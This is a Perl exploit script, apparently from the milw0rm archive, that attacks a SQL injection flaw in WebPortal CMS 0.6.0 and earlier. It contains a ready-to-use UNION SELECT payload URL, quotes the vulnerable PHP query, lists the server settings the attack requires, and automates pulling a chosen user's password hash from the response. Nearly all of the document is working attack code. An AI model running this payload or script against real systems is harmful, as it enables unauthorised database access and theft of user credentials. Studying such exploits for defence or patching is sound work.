#!/usr/bin/perl -w

# WebPortal CMS <= 0.6.0 Remote Sql Injection Exploit
# Script Site : webportal.ivanoculmine.com
# by x0kster - x0kster[AT]gmail[DOT]com
# PoC : http://site/index.php?m=index.php?m=-1'+union+select+1,concat(uname,0x3a,pass),3,4,5,6,7+from+portal_users+where+id=1/*
# Note : For work register_globals is must be turned on and warning messages too and magic_quotes_gpc must be turned off.
# Vuln Code in index.php:
# <?php
#  [...]
#  if (isset($m)) {
#  $result = db_query ("SELECT * FROM ".$prefix."modules WHERE id='$m';"); <- Vuln Code :-)
#  [...]
# ?>
# If we select an inesistent id of a mod, it'll try to include it.
# So we have a warning error with the hash!.

use LWP::UserAgent;
if (@ARGV < 2){
 print "---------------------------------------------------------------\n";
 print "WebPortal CMS <= 0.6.0 Remote Sql Injection Exploit by x0kster.\n";
 print "Usage : perl $0 site userid \n";
 print "Ex:     perl $0 http://localhost/webportal/ 1\n";
 print "Coded by x0kster -x0kster[AT]gmail[DOT]com   \n";
 print "---------------------------------------------------------------\n";
 exit();
 }
$b = LWP::UserAgent->new() or die "[-]LWP::UserAgent error.\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
print "[+]Exploiting.\n";
$host = $ARGV[0]."index.php?m=index.php?m=-1'+union+select+1,concat(uname,0x3a,pass),3,4,5,6,7+from+portal_users+where+id=".$ARGV[1]."/*";
$res = $b->request(HTTP::Request->new(GET=>$host));
$res->content =~ /([0-9a-fA-F]{32})/;
print "[+]Ok, hash for username with userid ".$ARGV[1]." is $1\n";
print "[+]Exploiting terminated.\n";
print "[+]Coded by x0kster\n";

# milw0rm.com [2007-12-31]
